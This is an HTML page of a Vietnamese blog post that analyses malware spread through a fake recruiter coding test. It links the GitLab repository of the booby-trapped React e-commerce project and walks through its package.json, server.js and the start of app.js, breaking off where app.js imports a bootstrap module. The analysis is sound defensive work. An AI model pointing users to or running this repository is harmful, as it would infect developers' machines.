<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>[Malware Analysis] E-commerce | nukoneZ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="🧩 Introduction Một nhà tuyển dụng nào đó đã gửi cho các bạn lập trình viên một bài test trên Linkedln và yêu cầu các bạn buil project trên máy các bạn vô tình các bạn là nạn nhân. Đây là đường link m">
<meta property="og:type" content="article">
<meta property="og:title" content="[Malware Analysis] E-commerce">
<meta property="og:url" content="https://kykhongbithac.github.io/2025/08/19/E-commerce/">
<meta property="og:site_name" content="nukoneZ">
<meta property="og:description" content="🧩 Introduction Một nhà tuyển dụng nào đó đã gửi cho các bạn lập trình viên một bài test trên Linkedln và yêu cầu các bạn buil project trên máy các bạn vô tình các bạn là nạn nhân. Đây là đường link m">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/rkDyh6IXel.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJrv2aL7xx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BJ8cEALXxl.png">
<meta property="article:published_time" content="2025-08-19T03:00:00.000Z">
<meta property="article:modified_time" content="2025-08-19T14:18:14.000Z">
<meta property="article:author" content="Huỳnh Quốc Kỳ">
<meta property="article:tag" content="Malware">
<meta property="article:tag" content="Reverse Engineering">
<meta property="article:tag" content="Analysis">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/rkDyh6IXel.png">
  
    <link rel="alternate" href="/atom.xml" title="nukoneZ" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/image/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/image/background.gif" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>nukoneZ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/image/avata.gif></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">nukoneZ </div>
      <div class="dot"></div>
      <div class="subtitle">Blog | CTF | Security </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.facebook.com/quocky05" title="Facebook"><i class="fa-brands fa-facebook"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.instagram.com/nukonez" title="Instagram"><i class="fa-brands fa-instagram"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/kykhongbithac" title="GitHub"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" href="mailto:huynhky3010@gmail.com" title="Gmail"><i class="fa-solid fa-envelope"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/Malware-Analysis/">
                Malware Analysis
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/Write-up/">
                Write-up
                <div class="category-count">6</div>
            </a>
        
            <a class="category-link" href="/categories/Blog/">
                Blog
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Analysis/" rel="tag">Analysis</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/FPTU/" rel="tag">FPTU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HCMUS-CTF-2025/" rel="tag">HCMUS-CTF-2025</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HOLACTF2025/" rel="tag">HOLACTF2025</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HacktheonSejong/" rel="tag">HacktheonSejong</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Korea-%F0%9F%87%B0%F0%9F%87%B7/" rel="tag">Korea 🇰🇷</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Malware/" rel="tag">Malware</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PTITHCM-CTF-2025/" rel="tag">PTITHCM CTF 2025</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Reverse-Engineering/" rel="tag">Reverse Engineering</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ScriptCTF2025/" rel="tag">ScriptCTF2025</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Security/" rel="tag">Security</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Trips/" rel="tag">Trips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/VM/" rel="tag">VM</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Archives</h3>
      
      
        <a class="archive-link" href="/archives/2025/09 ">
          September 2025 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2025/08 ">
          August 2025 
          <div class="archive-count">6 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/09/17/fob%20PTITHCM%20CTF%202025/" title="Reverse/fob (PTITHCM 2025)" >
            <div class="recent-link-text">
              Reverse/fob (PTITHCM 2025)
            </div>
          </a>
        
          <a class="recent-link" href="/2025/09/01/HOLACTF%202025%20Writeups/" title="HOLACTF 2025 Writeups" >
            <div class="recent-link-text">
              HOLACTF 2025 Writeups
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/19/Korea-2025/" title="Hacktheon Sejong 2025 🇰🇷" >
            <div class="recent-link-text">
              Hacktheon Sejong 2025 🇰🇷
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/19/Indefinite/" title="Reverse/Indefinite" >
            <div class="recent-link-text">
              Reverse/Indefinite
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/19/hcmusctf2025/" title="Reverse/HCMUS-CTF 2025" >
            <div class="recent-link-text">
              Reverse/HCMUS-CTF 2025
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-E-commerce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        [Malware Analysis] E-commerce
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-08-19T03:00:00.000Z" itemprop="datePublished">2025-08-19</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/Malware-Analysis/">Malware Analysis</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            21k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Analysis/" rel="tag">Analysis</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Malware/" rel="tag">Malware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Reverse-Engineering/" rel="tag">Reverse Engineering</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/" rel="tag">Security</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="🧩-Introduction"><a href="#🧩-Introduction" class="headerlink" title="🧩 Introduction"></a>🧩 Introduction</h1><ul>
<li>Một nhà tuyển dụng nào đó đã gửi cho các bạn lập trình viên một bài test trên Linkedln và yêu cầu các bạn buil project trên máy các bạn vô tình các bạn là nạn nhân.</li>
<li>Đây là đường link mà nhà tuyển dụng yêu cầu lập trình viên clone từ gitlab về và buil nó theo các dòng lệnh đã hướng dẫn.</li>
</ul>
<hr>
<h1 id="🔍-Sample-Acquisition"><a href="#🔍-Sample-Acquisition" class="headerlink" title="🔍 Sample Acquisition"></a>🔍 Sample Acquisition</h1><p><a target="_blank" rel="noopener" href="https://gitlab.com/topmanager1016-group/e-commerce">https://gitlab.com/topmanager1016-group/e-commerce</a><br><img src="https://hackmd.io/_uploads/rkDyh6IXel.png" alt="image"></p>
<hr>
<h1 id="📂-Static-Analysis"><a href="#📂-Static-Analysis" class="headerlink" title="📂 Static Analysis"></a>📂 Static Analysis</h1><ul>
<li>Đầu tiên mình sẽ clone toàn bộ project này về máy.</li>
<li>Tại phần <code>README.md</code> thì attacker hướng dẫn nạn nhân chạy một dự án React (E-Commerce).<br><img src="https://hackmd.io/_uploads/BJrv2aL7xx.png" alt="image"></li>
<li>Khi mình mở project này trên VS Code và đầu tiên là mình sẽ phân tích xem file <code>package.json</code> tại phần scripts nó đang thực hiện những gì.</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;concurrently \&quot;npm run server\&quot; \&quot;npm run client\&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;concurrently \&quot;npm run server\&quot; \&quot;npm run client\&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node ./api/server.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span> <span class="string">&quot;react-scripts --openssl-legacy-provider start&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;react-scripts --openssl-legacy-provider build&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;react-scripts eject&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eject&quot;</span><span class="punctuation">:</span> <span class="string">&quot;react-scripts eject&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Tại phần start tức là khi nạn nhân chạy project thì nó sẽ thực hiện đồng thời 2 lệnh sau.<br><code>npm run server</code><br><code>npm run client</code></li>
<li>Tiếp theo mình sẽ phân tích xem tại <code>node ./api/server.js</code> thằng <code>server.js</code> đang làm gì.</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&#x27;./app&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> connectDatabase = <span class="built_in">require</span>(<span class="string">&#x27;./config/database&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cloudinary = <span class="built_in">require</span>(<span class="string">&#x27;cloudinary&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">4001</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UncaughtException Error</span></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Error: <span class="subst">$&#123;err.message&#125;</span>`</span>);</span><br><span class="line">    process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectDatabase();</span></span><br><span class="line"></span><br><span class="line">cloudinary.<span class="title function_">config</span>(&#123;</span><br><span class="line">    <span class="attr">cloud_name</span>: process.<span class="property">env</span>.<span class="property">CLOUDINARY_NAME</span>,</span><br><span class="line">    <span class="attr">api_key</span>: process.<span class="property">env</span>.<span class="property">CLOUDINARY_API_KEY</span>,</span><br><span class="line">    <span class="attr">api_secret</span>: process.<span class="property">env</span>.<span class="property">CLOUDINARY_API_SECRET</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running`</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unhandled Promise Rejection</span></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;unhandledRejection&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Error: <span class="subst">$&#123;err.message&#125;</span>`</span>);</span><br><span class="line">    server.<span class="title function_">close</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Tại <code>server.js</code> không có gì đặc biệt ngoại trừ việc import app vào và thực thi nó.</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&#x27;./app&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>Tiếp theo mình sẽ phân tích <code>app.js</code> đang làm gì tiếp theo.</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> initAppBootstrap = <span class="built_in">require</span>(<span class="string">&#x27;./utils/bootstrap&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// config</span></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> !== <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">    <span 